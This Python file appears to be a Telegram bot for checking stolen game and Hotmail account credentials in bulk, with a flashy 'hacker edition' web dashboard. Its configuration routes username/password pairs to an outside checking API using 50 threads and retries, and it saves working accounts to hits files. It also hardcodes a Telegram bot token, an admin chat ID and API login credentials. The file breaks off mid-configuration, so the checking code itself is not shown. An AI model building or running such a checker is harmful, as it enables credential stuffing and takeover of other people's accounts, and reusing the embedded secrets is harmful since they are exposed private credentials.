# ========================================================================
#    GARENA CHECKER BOT V6.1 - HIEU UNG 3D + HACKER DEP
# ========================================================================
#    - Hieu ung 3D chuong trinh
#    - Hieu ung hacker matrix, laser, glitch
#    - Am thanh tu dong phat
#    - Khong luu account
#    - Giao dien dep mat voi hieu ung chuyen dong
# ========================================================================

import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
import struct
import math
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import random
import gc

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== BIEN TOAN CUC CHO AUDIO ==========
CUSTOM_AUDIO_PATH = "custom_audio.wav"
CUSTOM_AUDIO_DATA = None
AUDIO_LOCK = threading.Lock()

class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = self.generate_dashboard()
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            stats_json = json.dumps({
                "status": "alive",
                "checking": checking,
                "stats": stats,
                "services": list(SERVICE_ROUTES.keys()),
                "admin": ADMIN_USERNAME,
                "version": "6.1",
                "audio_custom": CUSTOM_AUDIO_DATA is not None
            })
            self.wfile.write(stats_json.encode('utf-8'))
        elif self.path == '/api/services':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            services_json = json.dumps(SERVICE_ROUTES)
            self.wfile.write(services_json.encode('utf-8'))
        elif self.path == '/audio':
            self.send_response(200)
            self.send_header('Content-type', 'audio/wav')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            audio_data = self.get_audio_data()
            self.wfile.write(audio_data)
        elif self.path == '/audio.mp3':
            self.send_response(200)
            self.send_header('Content-type', 'audio/mpeg')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            audio_data = self.get_audio_data()
            self.wfile.write(audio_data)
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def get_audio_data(self):
        global CUSTOM_AUDIO_DATA
        with AUDIO_LOCK:
            if CUSTOM_AUDIO_DATA:
                return CUSTOM_AUDIO_DATA
        return self.generate_default_audio()
    
    def generate_default_audio(self):
        try:
            sample_rate = 44100
            duration = 20.0
            num_samples = int(sample_rate * duration)
            
            audio_buffer = bytearray()
            for i in range(num_samples):
                t = i / sample_rate
                value = int(32767 * 0.3 * (
                    math.sin(2 * math.pi * 440 * t) * 0.4 +
                    math.sin(2 * math.pi * 554 * t) * 0.3 +
                    math.sin(2 * math.pi * 659 * t) * 0.2 +
                    math.sin(2 * math.pi * 880 * t) * 0.15 +
                    math.sin(2 * math.pi * 1100 * t) * 0.1 +
                    math.sin(2 * math.pi * 220 * t) * 0.2
                ))
                audio_buffer += struct.pack('<h', value)
            
            data_size = len(audio_buffer)
            header = b'RIFF'
            header += struct.pack('<I', 36 + data_size)
            header += b'WAVE'
            header += b'fmt '
            header += struct.pack('<IHHIIHH', 16, 1, 1, sample_rate, sample_rate * 2, 2, 16)
            header += b'data'
            header += struct.pack('<I', data_size)
            
            return header + bytes(audio_buffer)
        except Exception as e:
            print(f"[!] Loi tao audio: {e}")
            return b''
    
    def generate_dashboard(self):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime = time.time() - start_time if 'start_time' in globals() else 0
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
        
        hits_count = 0
        error_count = 0
        try:
            if os.path.exists(OUTPUT_HITS):
                with open(OUTPUT_HITS, 'r', encoding='utf-8') as f:
                    hits_count = len(f.readlines())
            if os.path.exists(OUTPUT_ERROR):
                with open(OUTPUT_ERROR, 'r', encoding='utf-8') as f:
                    error_count = len(f.readlines())
        except:
            pass
        
        bot_status = "Dang check" if checking else "San sang"
        bot_color = "#ff9800" if checking else "#4caf50"
        
        services_html = ""
        for key, value in SERVICE_ROUTES.items():
            services_html += f"""
            <div class="service-card" data-service="{key}">
                <div class="service-icon">{value['icon']}</div>
                <div class="service-info">
                    <div class="service-name">{key}</div>
                    <div class="service-desc">{value['desc']}</div>
                </div>
            </div>"""
        
        html_template = """<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GARENA CHECKER - HACKER EDITION</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: 'Orbitron', 'Courier New', monospace;
    background: #0a0a0a;
    min-height: 100vh;
    color: #00ff00;
    overflow: hidden;
    user-select: none;
}

/* ===== BACKGROUND ANIMATION ===== */
#bg-canvas {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
    opacity: 0.3;
}

#matrix-canvas {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
    opacity: 0.15;
}

#laser-canvas {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    pointer-events: none;
}

/* ===== CONTAINER 3D ===== */
.container {
    position: relative;
    z-index: 2;
    max-width: 1000px;
    margin: 20px auto;
    padding: 30px;
    perspective: 1200px;
}

/* ===== HEADER 3D ===== */
.header {
    text-align: center;
    padding: 40px 30px;
    background: rgba(0, 0, 0, 0.85);
    border-radius: 20px;
    border: 2px solid #00ff00;
    box-shadow: 0 0 50px rgba(0,255,0,0.2), inset 0 0 50px rgba(0,255,0,0.05);
    position: relative;
    overflow: hidden;
    transform: rotateX(2deg) rotateY(2deg);
    transition: all 0.5s ease;
    animation: float3d 6s ease-in-out infinite;
}

.header:hover {
    transform: rotateX(0deg) rotateY(0deg) scale(1.02);
    box-shadow: 0 0 80px rgba(0,255,0,0.4), inset 0 0 80px rgba(0,255,0,0.1);
}

@keyframes float3d {
    0%, 100% { transform: rotateX(2deg) rotateY(2deg); }
    50% { transform: rotateX(-2deg) rotateY(-2deg); }
}

.header::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: conic-gradient(
        from 0deg,
        transparent,
        rgba(0,255,0,0.05),
        transparent,
        rgba(0,255,255,0.05),
        transparent,
        rgba(255,0,255,0.05),
        transparent
    );
    animation: rotate 15s linear infinite;
}

@keyframes rotate {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

.header::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(0,255,0,0.03) 2px,
        rgba(0,255,0,0.03) 4px
    );
    pointer-events: none;
}

/* ===== GLITCH TEXT 3D ===== */
.title {
    font-size: 3.5em;
    font-weight: 900;
    color: #00ff00;
    text-shadow: 
        0 0 20px rgba(0,255,0,0.8),
        0 0 40px rgba(0,255,0,0.5),
        0 0 80px rgba(0,255,0,0.3),
        3px 3px 0 #ff00ff,
        -3px -3px 0 #00ffff;
    animation: glitch3d 3s infinite, textPulse 2s infinite;
    position: relative;
    z-index: 2;
    transform: translateZ(50px);
}

@keyframes glitch3d {
    0%, 100% { 
        transform: translateZ(50px) skew(0deg);
        text-shadow: 0 0 20px rgba(0,255,0,0.8), 3px 3px 0 #ff00ff, -3px -3px 0 #00ffff;
    }
    20% { 
        transform: translateZ(50px) skew(2deg);
        text-shadow: -3px 0 20px #ff0000, 3px 0 20px #00ffff, 0 0 40px #00ff00;
    }
    40% { 
        transform: translateZ(50px) skew(-2deg);
        text-shadow: 3px 0 20px #ff00ff, -3px 0 20px #ffff00, 0 0 40px #00ff00;
    }
    60% { 
        transform: translateZ(50px) skew(1deg);
        text-shadow: 0 0 30px #00ff00, 5px 5px 0 #ff00ff, -5px -5px 0 #00ffff;
    }
    80% { 
        transform: translateZ(50px) skew(-1deg);
        text-shadow: 0 0 30px #00ff00, -5px 5px 0 #ff00ff, 5px -5px 0 #00ffff;
    }
}

@keyframes textPulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.9; }
}

.subtitle {
    font-size: 1.2em;
    color: #88ff88;
    text-shadow: 0 0 20px rgba(0,255,0,0.3);
    animation: flicker 2s infinite;
    position: relative;
    z-index: 2;
}

@keyframes flicker {
    0%, 100% { opacity: 1; }
    5% { opacity: 0.5; }
    10% { opacity: 1; }
    95% { opacity: 1; }
    96% { opacity: 0.3; }
    97% { opacity: 1; }
}

/* ===== 3D SOCIAL BUTTONS ===== */
.social-buttons {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin-top: 20px;
    position: relative;
    z-index: 2;
    transform: translateZ(30px);
}

.social-btn {
    display: inline-flex;
    align-items: center;
    gap: 10px;
    padding: 12px 25px;
    border-radius: 50px;
    font-weight: bold;
    font-size: 1em;
    color: white;
    text-decoration: none;
    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    position: relative;
    overflow: hidden;
    border: none;
    cursor: pointer;
    transform: rotateX(5deg) rotateY(5deg);
}

.social-btn:hover {
    transform: rotateX(0deg) rotateY(0deg) scale(1.1) translateZ(20px);
    box-shadow: 0 20px 60px rgba(0,255,0,0.3);
}

.social-btn.tiktok {
    background: linear-gradient(135deg, #00f2ea, #ff0050);
    box-shadow: 0 0 30px rgba(255,0,80,0.3);
}

.social-btn.telegram {
    background: linear-gradient(135deg, #0088cc, #004488);
    box-shadow: 0 0 30px rgba(0,136,204,0.3);
}

/* ===== STATUS BADGE 3D ===== */
.status-badge {
    display: inline-block;
    padding: 12px 30px;
    border-radius: 50px;
    font-weight: bold;
    font-size: 1.1em;
    margin-top: 15px;
    background: BOT_COLOR;
    color: white;
    box-shadow: 0 0 30px rgba(0,255,0,0.5);
    animation: pulse3d 2s infinite;
    position: relative;
    z-index: 2;
    transform: translateZ(40px);
}

@keyframes pulse3d {
    0%, 100% { transform: translateZ(40px) scale(1); box-shadow: 0 0 30px rgba(0,255,0,0.5); }
    50% { transform: translateZ(60px) scale(1.05); box-shadow: 0 0 60px rgba(0,255,0,0.8); }
}

/* ===== AUDIO INDICATOR ===== */
.audio-indicator {
    display: inline-block;
    padding: 8px 20px;
    border-radius: 50px;
    font-size: 0.9em;
    margin-top: 10px;
    background: rgba(0,255,0,0.15);
    border: 1px solid #00ff00;
    color: #00ff00;
    position: relative;
    z-index: 2;
    animation: audioPulse 1.5s infinite;
}

.audio-indicator .dot {
    display: inline-block;
    width: 10px;
    height: 10px;
    background: #00ff00;
    border-radius: 50%;
    margin-right: 10px;
    animation: dotPulse 1s infinite;
}

@keyframes audioPulse {
    0%, 100% { box-shadow: 0 0 20px rgba(0,255,0,0.2); }
    50% { box-shadow: 0 0 40px rgba(0,255,0,0.5); }
}

@keyframes dotPulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.5); opacity: 0.5; }
}

/* ===== STATS GRID 3D ===== */
.stats-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 20px;
    margin: 30px 0;
    transform: translateZ(20px);
}

.stat-card {
    background: linear-gradient(145deg, rgba(0,255,0,0.05), rgba(0,0,0,0.8));
    border-radius: 15px;
    padding: 25px 20px;
    text-align: center;
    border: 1px solid rgba(0,255,0,0.2);
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    cursor: pointer;
    transform: rotateX(5deg);
    position: relative;
    overflow: hidden;
}

.stat-card:hover {
    transform: rotateX(0deg) scale(1.05) translateZ(30px);
    border-color: #00ff00;
    box-shadow: 0 20px 50px rgba(0,255,0,0.3);
}

.stat-card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 3px;
    background: linear-gradient(90deg, transparent, #00ff00, transparent);
    animation: shimmer 2s infinite;
}

@keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
}

.stat-value {
    font-size: 2.8em;
    font-weight: 900;
    margin-bottom: 8px;
    text-shadow: 0 0 30px currentColor;
}

.stat-label {
    font-size: 0.8em;
    color: #88aa88;
    text-transform: uppercase;
    letter-spacing: 2px;
}

.stat-hits .stat-value { color: #00ff00; }
.stat-error .stat-value { color: #ff6b35; }
.stat-checked .stat-value { color: #00ccff; }
.stat-time .stat-value { color: #ff00ff; font-size: 1.4em; }

/* ===== SERVICES 3D ===== */
.section-title {
    font-size: 2em;
    text-align: center;
    margin: 30px 0 20px;
    text-shadow: 0 0 30px rgba(0,255,0,0.3);
    animation: flicker 2s infinite;
    transform: translateZ(30px);
}

.services-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
    margin-bottom: 30px;
    transform: translateZ(10px);
}

.service-card {
    background: linear-gradient(145deg, rgba(0,255,0,0.05), rgba(0,0,0,0.7));
    border-radius: 12px;
    padding: 20px;
    display: flex;
    align-items: center;
    gap: 15px;
    border: 1px solid rgba(0,255,0,0.1);
    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    cursor: pointer;
    position: relative;
    overflow: hidden;
}

.service-card:hover {
    transform: translateZ(30px) scale(1.05);
    border-color: #00ff00;
    box-shadow: 0 15px 40px rgba(0,255,0,0.2);
    background: linear-gradient(145deg, rgba(0,255,0,0.1), rgba(0,0,0,0.8));
}

.service-card::after {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: conic-gradient(
        from 0deg,
        transparent,
        rgba(0,255,0,0.05),
        transparent,
        rgba(0,255,255,0.05),
        transparent
    );
    animation: rotate 10s linear infinite;
    opacity: 0;
    transition: opacity 0.3s;
}

.service-card:hover::after {
    opacity: 1;
}

.service-icon {
    font-size: 2.2em;
    animation: bounce 2s infinite;
    position: relative;
    z-index: 2;
}

@keyframes bounce {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
}

.service-info {
    flex: 1;
    position: relative;
    z-index: 2;
}

.service-name {
    font-size: 1.1em;
    font-weight: 700;
    color: #fff;
    margin-bottom: 3px;
}

.service-desc {
    font-size: 0.75em;
    color: #88aa88;
}

/* ===== FOOTER ===== */
.footer {
    text-align: center;
    padding: 20px;
    color: #446644;
    font-size: 0.8em;
    border-top: 1px solid rgba(0,255,0,0.1);
    margin-top: 20px;
    transform: translateZ(10px);
}

.footer a {
    color: #00ff00;
    text-decoration: none;
    transition: all 0.3s;
}

.footer a:hover {
    color: #ff00ff;
    text-shadow: 0 0 20px #ff00ff;
}

/* ===== RESPONSIVE ===== */
@media (max-width: 768px) {
    .title { font-size: 2em; }
    .stats-grid { grid-template-columns: repeat(2, 1fr); }
    .services-grid { grid-template-columns: 1fr; }
    .social-buttons { flex-direction: column; align-items: center; }
    .header { padding: 20px; }
    .container { padding: 15px; margin: 10px; }
}

@media (max-width: 480px) {
    .title { font-size: 1.5em; }
    .stats-grid { grid-template-columns: 1fr 1fr; gap: 10px; }
    .stat-value { font-size: 2em; }
}
</style>
</head>
<body>

<!-- ===== CANVAS BACKGROUNDS ===== -->
<canvas id="bg-canvas"></canvas>
<canvas id="matrix-canvas"></canvas>
<canvas id="laser-canvas"></canvas>

<!-- ===== CONTAINER ===== -->
<div class="container">
    <div class="header">
        <div class="title">🎮 GARENA CHECKER</div>
        <div class="subtitle">Version 6.1 - HACKER EDITION</div>
        <div class="subtitle">Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;text-decoration:none;">@baohuyno1</a></div>
        
        <div class="social-buttons">
            <a href="https://tiktok.com/@baohuy1109" target="_blank" class="social-btn tiktok">🎵 TikTok @baohuy1109</a>
            <a href="https://t.me/baohuyno1" target="_blank" class="social-btn telegram">✈️ Telegram</a>
        </div>
        
        <div class="status-badge" id="status-badge" style="background: BOT_COLOR;">🔴 San sang</div>
        <div class="audio-indicator"><span class="dot"></span> 🔊 AM THANH DANG PHAT</div>
        <div class="subtitle" style="font-size:0.8em;color:#446644;margin-top:5px;">⏱ Uptime: UPTIME_PLACEHOLDER</div>
    </div>
    
    <!-- ===== STATS ===== -->
    <div class="stats-grid">
        <div class="stat-card stat-hits"><div class="stat-value">HITS_PLACEHOLDER</div><div class="stat-label">✅ Hits</div></div>
        <div class="stat-card stat-error"><div class="stat-value">ERROR_PLACEHOLDER</div><div class="stat-label">⚠️ Errors</div></div>
        <div class="stat-card stat-checked"><div class="stat-value">CHECKED_PLACEHOLDER</div><div class="stat-label">🔄 Checked</div></div>
        <div class="stat-card stat-time"><div class="stat-value">CURRENT_TIME_PLACEHOLDER</div><div class="stat-label">📅 Thoi gian</div></div>
    </div>
    
    <!-- ===== SERVICES ===== -->
    <div class="section-title">📋 DICH VU HO TRO</div>
    <div class="services-grid">
        SERVICES_HTML_PLACEHOLDER
    </div>
    
    <div class="footer">
        <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> - All rights reserved</p>
        <p style="color:#334433;font-size:0.7em;">⚡ HACKER EDITION - 3D EFFECTS - AUTO AUDIO</p>
    </div>
</div>

<!-- ===== AUDIO ===== -->
<audio id="bg-audio" loop autoplay>
    <source src="/audio" type="audio/wav">
</audio>

<script>
// ========================================================================
// 1. 3D BACKGROUND EFFECT
// ========================================================================
const bgCanvas = document.getElementById('bg-canvas');
const bgCtx = bgCanvas.getContext('2d');
bgCanvas.width = window.innerWidth;
bgCanvas.height = window.innerHeight;

let particles = [];
const PARTICLE_COUNT = 150;

class Particle {
    constructor() {
        this.reset();
    }
    reset() {
        this.x = Math.random() * bgCanvas.width;
        this.y = Math.random() * bgCanvas.height;
        this.z = Math.random() * 300 + 50;
        this.size = Math.random() * 3 + 1;
        this.speed = Math.random() * 0.5 + 0.1;
        this.color = `hsl(${120 + Math.random() * 60}, 100%, ${40 + Math.random() * 30}%)`;
        this.opacity = Math.random() * 0.8 + 0.2;
    }
    update() {
        this.z -= this.speed;
        if (this.z < 10) this.reset();
        const scale = 300 / this.z;
        this.sx = this.x * scale + bgCanvas.width/2 - this.x;
        this.sy = this.y * scale + bgCanvas.height/2 - this.y;
        this.ssize = this.size * scale;
    }
    draw(ctx) {
        ctx.fillStyle = this.color;
        ctx.globalAlpha = this.opacity * (300 / this.z);
        ctx.beginPath();
        ctx.arc(this.sx, this.sy, this.ssize, 0, Math.PI * 2);
        ctx.fill();
        ctx.globalAlpha = 1;
    }
}

for (let i = 0; i < PARTICLE_COUNT; i++) {
    particles.push(new Particle());
}

function drawBg() {
    bgCtx.fillStyle = 'rgba(10, 10, 10, 0.3)';
    bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
    for (const p of particles) {
        p.update();
        p.draw(bgCtx);
    }
    requestAnimationFrame(drawBg);
}
drawBg();

// ========================================================================
// 2. MATRIX EFFECT
// ========================================================================
const matrixCanvas = document.getElementById('matrix-canvas');
const matrixCtx = matrixCanvas.getContext('2d');
matrixCanvas.width = window.innerWidth;
matrixCanvas.height = window.innerHeight;

const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}[]|;:,.<>?~';
const fontSize = 14;
const columns = Math.ceil(matrixCanvas.width / fontSize);
const drops = [];
for (let i = 0; i < columns; i++) {
    drops[i] = Math.random() * -100;
}

function drawMatrix() {
    matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
    
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        const bright = Math.random() > 0.9 ? '#ffffff' : '#00ff00';
        matrixCtx.fillStyle = bright;
        matrixCtx.font = fontSize + 'px monospace';
        matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 50);

// ========================================================================
// 3. LASER EFFECT
// ========================================================================
const laserCanvas = document.getElementById('laser-canvas');
const laserCtx = laserCanvas.getContext('2d');
laserCanvas.width = window.innerWidth;
laserCanvas.height = window.innerHeight;

const laserColors = ['#00ff00', '#00ffff', '#ff00ff', '#ffff00', '#ff4444', '#44ff44', '#ff8800'];
let lasers = [];

class LaserBeam {
    constructor(x, y) {
        this.x = x || Math.random() * laserCanvas.width;
        this.y = y || Math.random() * laserCanvas.height;
        this.tx = Math.random() * laserCanvas.width;
        this.ty = Math.random() * laserCanvas.height;
        this.color = laserColors[Math.floor(Math.random() * laserColors.length)];
        this.width = Math.random() * 2 + 0.5;
        this.life = 0;
        this.maxLife = Math.random() * 60 + 30;
        this.particles = [];
    }
    update() {
        this.life++;
        if (Math.random() > 0.4) {
            this.particles.push({
                x: this.x + (this.tx - this.x) * Math.random(),
                y: this.y + (this.ty - this.y) * Math.random(),
                vx: (Math.random() - 0.5) * 2,
                vy: (Math.random() - 0.5) * 2,
                life: 0,
                maxLife: Math.random() * 20 + 10
            });
        }
        for (let i = this.particles.length - 1; i >= 0; i--) {
            const p = this.particles[i];
            p.x += p.vx;
            p.y += p.vy;
            p.life++;
            if (p.life > p.maxLife) this.particles.splice(i, 1);
        }
        if (this.life > this.maxLife) {
            const idx = lasers.indexOf(this);
            if (idx > -1) lasers.splice(idx, 1);
        }
    }
    draw(ctx) {
        const progress = this.life / this.maxLife;
        const alpha = progress < 0.1 ? progress * 10 : progress > 0.9 ? (1 - progress) * 10 : 1;
        const grad = ctx.createLinearGradient(this.x, this.y, this.tx, this.ty);
        grad.addColorStop(0, this.color + '00');
        grad.addColorStop(0.5, this.color + 'FF');
        grad.addColorStop(1, this.color + '00');
        ctx.strokeStyle = grad;
        ctx.lineWidth = this.width;
        ctx.globalAlpha = alpha;
        ctx.shadowColor = this.color;
        ctx.shadowBlur = 15;
        ctx.beginPath();
        ctx.moveTo(this.x, this.y);
        ctx.lineTo(this.tx, this.ty);
        ctx.stroke();
        ctx.shadowBlur = 0;
        for (const p of this.particles) {
            const pa = 1 - (p.life / p.maxLife);
            ctx.fillStyle = this.color;
            ctx.globalAlpha = pa * alpha;
            ctx.shadowColor = this.color;
            ctx.shadowBlur = 8;
            ctx.beginPath();
            ctx.arc(p.x, p.y, Math.random() * 2 + 1, 0, Math.PI * 2);
            ctx.fill();
            ctx.shadowBlur = 0;
        }
        ctx.globalAlpha = 1;
    }
}

function createLaser(x, y) {
    if (lasers.length < 80) lasers.push(new LaserBeam(x, y));
}

function drawLasers() {
    laserCtx.clearRect(0, 0, laserCanvas.width, laserCanvas.height);
    for (const l of lasers) {
        l.update();
        l.draw(laserCtx);
    }
    if (Math.random() > 0.97) {
        const fx = Math.random() * laserCanvas.width;
        const fy = Math.random() * laserCanvas.height;
        const fr = Math.random() * 40 + 20;
        const fc = laserColors[Math.floor(Math.random() * laserColors.length)];
        const g = laserCtx.createRadialGradient(fx, fy, 0, fx, fy, fr);
        g.addColorStop(0, fc + 'FF');
        g.addColorStop(1, fc + '00');
        laserCtx.fillStyle = g;
        laserCtx.beginPath();
        laserCtx.arc(fx, fy, fr, 0, Math.PI * 2);
        laserCtx.fill();
    }
    requestAnimationFrame(drawLasers);
}

for (let i = 0; i < 20; i++) createLaser();
drawLasers();

// Mouse laser
document.addEventListener('mousemove', function(e) {
    if (Math.random() > 0.85) {
        createLaser(e.clientX, e.clientY);
        if (lasers.length > 80) lasers.shift();
    }
});

document.addEventListener('click', function(e) {
    for (let i = 0; i < 8; i++) {
        createLaser(e.clientX, e.clientY);
    }
    if (lasers.length > 80) lasers.splice(0, 8);
});

// ========================================================================
// 4. AUDIO - TU DONG PHAT
// ========================================================================
const audio = document.getElementById('bg-audio');

function ensureAudio() {
    audio.volume = 0.25;
    audio.loop = true;
    audio.play().then(() => {
        console.log('🎵 Audio playing');
    }).catch(e => {
        console.log('Auto-play blocked, waiting for interaction...');
        document.addEventListener('click', function playOnce() {
            audio.play().catch(() => {});
            document.removeEventListener('click', playOnce);
        }, { once: true });
    });
}

audio.addEventListener('error', function() {
    audio.load();
    setTimeout(ensureAudio, 500);
});

setTimeout(ensureAudio, 300);

// ========================================================================
// 5. STATS UPDATE
// ========================================================================
function updateStats() {
    fetch('/stats').then(r => r.json()).then(d => {
        document.querySelector('.stat-hits .stat-value').textContent = d.stats?.hits || 0;
        document.querySelector('.stat-error .stat-value').textContent = d.stats?.errors || 0;
        document.querySelector('.stat-checked .stat-value').textContent = d.stats?.checked || 0;
        document.querySelector('.stat-time .stat-value').textContent = new Date().toLocaleTimeString('vi-VN');
        const badge = document.getElementById('status-badge');
        badge.textContent = d.checking ? '🔴 Dang check' : '🟢 San sang';
        badge.style.background = d.checking ? '#ff9800' : '#4caf50';
    }).catch(e => console.log('Error:', e));
}
setInterval(updateStats, 5000);
updateStats();

// ========================================================================
// 6. SERVICE CLICK 3D
// ========================================================================
document.querySelectorAll('.service-card').forEach(card => {
    card.addEventListener('click', function() {
        const name = this.querySelector('.service-name').textContent;
        this.style.borderColor = '#ff00ff';
        this.style.boxShadow = '0 0 60px rgba(255,0,255,0.6)';
        this.style.transform = 'translateZ(50px) scale(1.1)';
        setTimeout(() => {
            this.style.borderColor = 'rgba(0,255,0,0.1)';
            this.style.boxShadow = 'none';
            this.style.transform = '';
        }, 500);
        console.log('Service:', name);
    });
});

// ========================================================================
// 7. RESIZE
// ========================================================================
window.addEventListener('resize', () => {
    bgCanvas.width = window.innerWidth;
    bgCanvas.height = window.innerHeight;
    matrixCanvas.width = window.innerWidth;
    matrixCanvas.height = window.innerHeight;
    laserCanvas.width = window.innerWidth;
    laserCanvas.height = window.innerHeight;
});

console.log('🔥 GARENA CHECKER HACKER EDITION LOADED!');
console.log('💀 3D Effects - Laser - Matrix - Auto Audio');
</script>
</body>
</html>"""
        
        html = html_template.replace('BOT_COLOR', bot_color)
        html = html.replace('BOT_STATUS_PLACEHOLDER', bot_status)
        html = html.replace('ADMIN_USERNAME_PLACEHOLDER', ADMIN_USERNAME)
        html = html.replace('UPTIME_PLACEHOLDER', uptime_str)
        html = html.replace('HITS_PLACEHOLDER', str(hits_count))
        html = html.replace('ERROR_PLACEHOLDER', str(error_count))
        html = html.replace('CHECKED_PLACEHOLDER', str(stats.get('checked', 0)))
        html = html.replace('CURRENT_TIME_PLACEHOLDER', current_time)
        html = html.replace('SERVICES_HTML_PLACEHOLDER', services_html)
        
        return html
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    global start_time
    start_time = time.time()
    global CUSTOM_AUDIO_DATA
    if os.path.exists(CUSTOM_AUDIO_PATH):
        try:
            with open(CUSTOM_AUDIO_PATH, 'rb') as f:
                CUSTOM_AUDIO_DATA = f.read()
            print(f"[*] Da load audio custom: {len(CUSTOM_AUDIO_DATA)} bytes")
        except:
            pass
    
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        print(f"[*] Dashboard: http://0.0.0.0:{port}")
        print(f"[*] Audio: http://0.0.0.0:{port}/audio")
        print(f"[*] HIEU UNG 3D + HACKER DEP")
        print(f"[*] AM THANH TU DONG PHAT")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading_module.Thread(target=start_render_server, daemon=True).start()

# ========== CAU HINH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.3

CHECKMULTI_THREADS = 30
CHECKMULTI_DELAY = 0.5
CHECKMULTI_BATCH_SIZE = 10
CHECKMULTI_BATCH_DELAY = 3.0

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"
OUTPUT_LOC = "loc_accounts.txt"

MAX_MESSAGE_LENGTH = 4000

SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan + FC Online",
        "icon": "🎮",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧",
        "params": ["tk", "mk"],
        "extra_params": {"keyword": ""}
    },
    "fc": {
